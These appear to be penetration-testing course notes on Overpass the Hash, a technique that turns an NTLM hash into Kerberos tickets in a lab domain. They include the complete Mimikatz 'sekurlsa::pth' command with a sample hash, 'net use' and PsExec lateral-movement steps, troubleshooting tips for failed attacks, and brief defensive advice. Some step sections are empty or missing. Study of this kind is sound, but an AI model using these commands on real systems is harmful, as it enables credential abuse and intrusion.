## Overview

**Overpass the Hash** is a lateral movement technique that turns an **NTLM hash** into a **Kerberos Ticket Granting Ticket**.

Plain English:

```text
Pass the Hash uses NTLM directly.
Overpass the Hash uses the NTLM hash to get Kerberos tickets.
```

The goal is to move from:

```text
I only have the user's NTLM hash.
```

to:

```text
I have a Kerberos TGT for that user.
```

Once we have the TGT, we can request service tickets and use Kerberos-based tools.

---

# Simple Mental Model

## Normal Kerberos Login

```text
User enters password
↓
Windows derives authentication keys
↓
User gets Kerberos TGT
↓
User requests TGS tickets for services
↓
User accesses network services
```

## Overpass the Hash

```text
Attacker has NTLM hash
↓
Mimikatz creates a process using that hash
↓
Process can request Kerberos tickets as that user
↓
Attacker gets TGT
↓
Attacker uses Kerberos for lateral movement
```

---

# Why This Is Different from Pass the Hash

## Pass the Hash

```text
NTLM hash
↓
NTLM authentication
↓
Access NTLM-enabled service
```

## Overpass the Hash

```text
NTLM hash
↓
Kerberos TGT
↓
Kerberos authentication
↓
Access Kerberos-enabled service
```

Key difference:

```text
Pass the Hash uses NTLM.
Overpass the Hash converts the hash into Kerberos access.
```

---

# When Overpass the Hash Is Useful

Use Overpass the Hash when:

```text
you have a user's NTLM hash
you want Kerberos tickets
the target service prefers or requires Kerberos
you want to use tools that do not accept NTLM hashes
you want to avoid direct NTLM authentication over the network
```

Example:

```text
Official Sysinternals PsExec does not accept NTLM hashes.
But it can work if the current session already has Kerberos tickets.
```

# Step 3 – Run Overpass the Hash with Mimikatz

Use:

```text

```

Command:


Options:

| Option | Meaning |
|---|---|
| `/user:jen` | User to impersonate for authentication |
| `/domain:corp.com` | User’s domain |
| `/ntlm:<hash>` | NTLM hash for the user |
| `/run:powershell` | Process to launch |

# Important whoami Confusion

In the new PowerShell window, running:

```cmd
whoami
```

may still show:

```text
corp\jeff
```

This is expected.

Why?

```text
whoami checks the current process token.
It does not inspect imported Kerberos authentication material.
```

Plain English:

```text
The local token may still look like jeff.
The network authentication can still happen as jen.
```

So do not rely only on `whoami` immediately after `sekurlsa::pth`.

Use `klist` and network access to confirm Kerberos context.

---

# Step 4 – Check Current Kerberos Tickets

In the new PowerShell window:

```cmd
klist
```

Initial output:

```text
Cached Tickets: (0)
```

This is normal.

Why?

```text
No Kerberos ticket has been requested yet.
The new process has the material needed to request tickets, but it has not used it.
```

# Step 5 – Trigger Kerberos Ticket Creation

Access a network resource to force Windows to request Kerberos tickets.

Example:

```cmd
net use \\files04
```

Expected output:

```text
The command completed successfully.
```

What this does:

```text
requests a TGT for jen
requests a TGS for CIFS on FILES04
```



# Overpass the Hash Command Breakdown

```text
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

| Part | Meaning |
|---|---|
| `sekurlsa::pth` | Mimikatz pass-the-hash / overpass module |
| `/user:jen` | Target user |
| `/domain:corp.com` | Target domain |
| `/ntlm:<hash>` | NTLM hash to inject |
| `/run:powershell` | Start a new PowerShell process |

The new process is where you perform Kerberos actions.

---

# Why net use Is Used

`net use \\files04` is not special.

It is just a convenient way to access a domain resource.

Any action requiring domain authentication could trigger Kerberos ticket creation, such as:

```text
accessing an SMB share
connecting to a service
running a remote admin tool
accessing a Kerberos-backed resource
```

In this lesson:

```text
net use \\files04
```

creates:

```text
TGT for jen
TGS for cifs/files04
```

---

# Ticket Types in This Attack

| Ticket | How to Recognize | Purpose |
|---|---|---|
| TGT | `krbtgt/CORP.COM` | Allows requesting service tickets |
| TGS | `cifs/files04` | Allows access to a specific service |

Plain English:

```text
TGT = general Kerberos login ticket.
TGS = ticket for one specific service.
```

---

# Why PsExec Works After Overpass

Official Sysinternals PsExec does not accept NTLM hashes directly.

But after Overpass the Hash:

```text
the session has Kerberos tickets for jen
```

So PsExec can authenticate using the current Kerberos context.

That means we can run:

```powershell
.\PsExec.exe \\files04 cmd
```

without:

```text
-u
-p
-hash
```

because Kerberos handles authentication.

---

# Pass the Hash vs Overpass the Hash

| Technique | Starts With | Produces | Uses |
|---|---|---|---|
| Pass the Hash | NTLM hash | NTLM authentication | SMB/NTLM |
| Overpass the Hash | NTLM hash | Kerberos TGT/TGS | Kerberos |

## Pass the Hash Example

```text
hash → authenticate directly over NTLM
```

## Overpass the Hash Example

```text
hash → create Kerberos-capable process → request TGT → use Kerberos
```

---

# Overpass the Hash vs Pass the Ticket

| Technique | Starts With | Result |
|---|---|---|
| Overpass the Hash | NTLM hash | Obtain Kerberos tickets |
| Pass the Ticket | Kerberos ticket | Inject and reuse existing ticket |

Plain English:

```text
Overpass the Hash creates Kerberos tickets from a hash.
Pass the Ticket reuses Kerberos tickets you already have.
```

# Required Conditions

Overpass the Hash requires:

```text
NTLM hash for target user
local admin or SYSTEM privileges to run Mimikatz properly
ability to create a new process
network access to a domain controller
Kerberos reachable
target service accepts Kerberos
```

For remote execution after ticket creation, you also need:

```text
target user has required access on the remote host
remote execution method is allowed
service ports are reachable
```

In the lesson:

```text
jen has access to FILES04
PsExec can use the Kerberos context
```

# Common Failure Causes

## `sekurlsa::pth` Fails

Possible causes:

```text
Mimikatz not running elevated
privilege::debug not enabled
AV/EDR blocks Mimikatz
Credential Guard blocks credential manipulation
wrong hash format
```

---

## `klist` Shows No Tickets After net use

Possible causes:

```text
net use failed
DC unreachable
DNS issue
Kerberos blocked
wrong domain name
time skew
hash is wrong
target accessed using IP instead of hostname
NTLM used instead of Kerberos
```

Try using hostname:

```cmd
net use \\files04
```

Avoid using IP when you want Kerberos:

```cmd
net use \\192.168.50.73
```

because IP-based access often causes NTLM fallback.

---

## whoami Still Shows Original User

This can be normal before remote access.

Remember:

```text
whoami checks local token
Kerberos tickets affect network authentication
```

Validate with:

```cmd
klist
net use \\files04
```

and remote execution output.

---

## PsExec Fails

Possible causes:

```text
jen lacks local admin on FILES04
ADMIN$ unavailable
SMB blocked
Kerberos ticket not available
PsExec not using Kerberos context
target name mismatch
File and Printer Sharing disabled
```

Check:

```cmd
klist
dir \\files04\ADMIN$
```

Reduce Overpass the Hash risk by:

```text
protecting LSASS

monitoring Mimikatz behavior
monitoring abnormal Kerberos ticket requests
monitoring PsExec activity
enforcing strong endpoint controls
```

# Key Takeaways

- Overpass the Hash converts an NTLM hash into Kerberos authentication.
- It starts with a user’s NTLM hash.
- Mimikatz `sekurlsa::pth` creates a new process with the injected hash material.
- `whoami` may still show the original user because it checks the local token.
- `klist` is used to inspect Kerberos tickets.
- Initially, no tickets may be present.
- Accessing a network resource such as `\\files04` triggers ticket creation.
- A TGT is identified by `krbtgt/CORP.COM`.
- A TGS is identified by the target service, such as `cifs/files04`.
- Once Kerberos tickets exist, tools like official PsExec can reuse them.
- This is different from Pass the Hash because the final authentication uses Kerberos, not NTLM.
- This is different from Pass the Ticket because it starts with a hash, not an existing ticket.
- Always verify success with `klist`, `whoami`, and `hostname`.
